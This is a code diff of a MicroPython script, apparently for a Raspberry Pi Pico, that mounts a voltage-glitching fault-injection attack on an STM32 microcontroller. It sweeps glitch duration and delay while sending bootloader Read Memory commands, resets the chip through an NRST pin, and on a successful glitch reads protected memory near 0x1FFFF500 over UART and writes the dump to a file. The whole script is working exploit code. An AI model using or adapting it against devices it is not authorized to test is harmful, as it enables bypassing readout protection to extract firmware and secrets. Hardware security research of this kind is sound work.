@@ -56,7 +56,7 @@ def drop_voltage():
     nop()
     jmp(x_dec, "glitch_timing")
     
-    nop()	
+    #nop()
 
     # Set Pin 3 to Low. Return opertaions as per normal
     set(pins, 0)
@@ -99,6 +99,10 @@ bit_string = 0
 led = Pin("LED", Pin.OUT)
 led.value(1)
 
+# NRST for STM32
+NRST = Pin(10, Pin.OUT)
+NRST.value(1)
+
 # Initialize UART
 # When connected in Normal operation, parity = None
 # When connected in Bootloader mode, partity = 0 (EVEN)
@@ -134,8 +138,8 @@ def calc_glitch_cycles(duration):
 
 
 while True:
-    for i in range (180, 200, 20): #glitch duration. Accurate to ~20ns
-        for j in range(9000, 12000, 20): #delay duration. Accurate to ~20ns
+    for i in range (140, 160, 20): #glitch duration. Accurate to ~20ns
+        for j in range(9500, 10700, 20): #delay duration. Accurate to ~20ns. Maximum up to 10700
 
             t_end = time.time() + 2
             #fd.write(f"Glitch duration: {i}, Delay Duration {j} \n")
@@ -168,23 +172,93 @@ while True:
 
             while time.time() < t_end:
                 # Read Memory Commands Start
-                
-                # Select Read Memory Command & trigger rising edge
-                cmd = struct.pack('B', 0x11)
-                uart.write(cmd)
-                cmd = struct.pack('B', 0xee)
-                uart.write(cmd)
-                
-                received, = struct.unpack('b', uart.read())
-                
-                # Checks if ACK or NACK is sent. If NACK is received, does not enter if statement and tries to glitch again
-                
-                if (received == -1):
-                    print("Glitched: -1")
+                try:
+                    # Select Read Memory Command & trigger rising edge
+                    cmd = struct.pack('B', 0x11)
+                    uart.write(cmd)
+                    cmd = struct.pack('B', 0xee)
+                    uart.write(cmd)
+                    
+                    received, = struct.unpack('b', uart.read())
+                    
+                    # Checks if ACK or NACK is sent. If NACK is received, does not enter if statement and tries to glitch again
+                    
+                    if (received == -1 or received == 1):
+                        print(f"Glitched: {received}")
+
+                        continue
+
+                    if (received != 0x1f):
+                        # ACK is received
+                        print("Glitched")
+                        print(received)
+                        
+                        #stop the SM from glitching
+                        sm.active(0)
+                        
+                        #Vary this from 0x1ffff000 to 0x1fffffff
+                        cmd = struct.pack('B', 0x1f)
+                        uart.write(cmd)
+                        cmd = struct.pack('B', 0xff)
+                        uart.write(cmd)
+                        cmd = struct.pack('B', 0xf5)
+                        uart.write(cmd)
+                        cmd = struct.pack('B', 0x00)
+                        uart.write(cmd)
+                        cmd = struct.pack('B', 0x15)
+                        uart.write(cmd)
+                        
+                        received, = struct.unpack('b', uart.read())
+                        
+                        cmd = struct.pack('B', 0xff)
+                        uart.write(cmd)
+                        cmd = struct.pack('B', 0x00)
+                        uart.write(cmd)
+                        
+                        received = uart.read().hex()
+                        print(received)
+                        fd.write(f"Glitch duration: {i}, Delay Duration {j} \n")
+                        fd.write(received)
+                        #quit()
+                        
+                        # Reenable State Machine to glitch next loop
+                        sm.active(1)
+                        sys.exit()
+                    
+                        
+                    print(received)
+                    time.sleep(0.01)
+                    
+                except:
+                    print("reset")
+                    NRST.value(0)
+                    time.sleep(1)
+                    NRST.value(1)
+                    cmd = struct.pack('B', 0x7f)
+                    uart.write(cmd)
+                    received = struct.unpack('b', uart.read())
+                    print(hex(received))
+                    
+                ''' 
+                except:
+                    
+                    print("Reset")
+                    
+                    #Reset stm if no input has been received within 1 sec
                     sm = StateMachine(0, reset, freq = 2_000, set_base = Pin(3))
                     sm.active(1)
-                    time.sleep(1)
+                    
+                    tx = Pin(12, Pin.OUT)
+                    rx = Pin(13, Pin.OUT)
+                    tx.value(0)
+                    rx.value(0)
+                    
+                    time.sleep(0.5)
                     sm.active(0)
+                    
+                    uart = UART(0, baudrate=115200, tx=Pin(12), rx=Pin(13))
+                    uart.init(bits=8, parity=0, stop=1)
+                    
                     
                     time.sleep(0.5)
                     sm = StateMachine(0, drop_voltage, freq = 100_000_000, set_base = Pin(3), in_base = Pin(4))
@@ -195,44 +269,8 @@ while True:
                     uart.write(cmd)
                     received = struct.unpack('b', uart.read())
                     print(hex(received))
-                    
-                    continue
-
-                if (received != 0x1f):
-                    # ACK is received
-                    print("Glitched")
-                    print(received)
-                    
-                    #stop the SM from glitching
-                    sm.active(0)
-                    
-                    #Vary this from 0x1ffff000 to 0x1fffffff
-                    cmd = struct.pack('B', 0x1f)
-                    uart.write(cmd)
-                    cmd = struct.pack('B', 0xff)
-                    uart.write(cmd)
-                    cmd = struct.pack('B', 0xf7)
-                    uart.write(cmd)
-                    cmd = struct.pack('B', 0x00)
-                    uart.write(cmd)
-                    cmd = struct.pack('B', 0x17)
-                    uart.write(cmd)
-                    
-                    received, = struct.unpack('b', uart.read())
-                    
-                    cmd = struct.pack('B', 0xff)
-                    uart.write(cmd)
-                    cmd = struct.pack('B', 0x00)
-                    uart.write(cmd)
-                    
-                    received = uart.read().hex()
-                    print(received)
-                    fd.write(f"Glitch duration: {i}, Delay Duration {j} \n")
-                    fd.write(received)
-                    quit()
-                    
-                print(received)
-                time.sleep(0.01)
+                    '''
+                        
                 
 
                 
